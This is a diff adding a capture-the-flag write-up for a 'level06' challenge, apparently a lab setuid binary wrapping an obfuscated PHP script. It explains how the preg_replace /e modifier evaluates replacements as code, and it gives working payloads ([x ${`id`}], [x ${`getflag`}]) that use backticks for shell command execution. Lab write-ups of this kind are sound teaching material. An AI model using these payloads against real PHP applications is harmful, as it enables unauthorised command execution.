@@ -1,0 +1,65 @@
+php script explanation:
+
+#!/usr/bin/php
+<?php
+
+function y($m)
+{
+	$m = preg_replace("/\./", " x ", $m);
+	$m = preg_replace("/@/", " y", $m);
+	return $m;
+}
+
+// x function takes $y file content, and replaces some characters inside, using the unsecure /e modifier for preg_replace
+function x($y, $z)
+{
+	$a = file_get_contents($y);
+	// replace string of type [x ANYTHING] to ANYTHING
+	// uses the output of the y function with ANYTHING (represented by the subgroup \2) as a replacement pattern (which is ANYTHING with . replaced by x and @ replaced by y
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+	return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+print $r;
+
+?>
+
+
+1 - In level06 home folder, we find :
+	- a PHP script
+	- a setuid ELF file
+we end up understanding that they correspond to the same thing (using ltrace, launching the program etc)
+
+2 - we deobfuscate the level06.php, and see the unsecure /e modifier is used for the preg_replace function (https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace)
+The e modifier makes the preg_replace function evaluate the replacement parameter as PHP code !
+we might be able to execute unexpected commands from this script !
+
+3 - We create a minimal version of the script to test the regex
+
+<?php
+function y($m)
+{
+	$m = preg_replace("/\./", " x ", $m);
+	$m = preg_replace("/@/", " y", $m);
+	return $m;
+}
+
+echo preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $argv[1]);
+?>
+
+4 - We try different things to get code execution :
+	- [x system('ls');] --> doesn't work, quotes are escaped
+	- [x system($argv[2]);] --> doesn't work, argv is not recognized in the function's scope
+	
+We actually also need to find a way to execute code inside the y() function, as our input is trapped inside quotes...
+
+We find out that backticks are interpreted for command execution, like in bash, and are not escaped by preg_replace
+
+5 - We find this article --> https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation
+We try [x ${`id`}] --> PHP launches 'id' with bash, and tries to interpret its output as a variable
+it returns an error, but we don't care, as the error tells us the output of our commands !
+
+6 - We use the payload [x ${`getflag`}] and get the flag
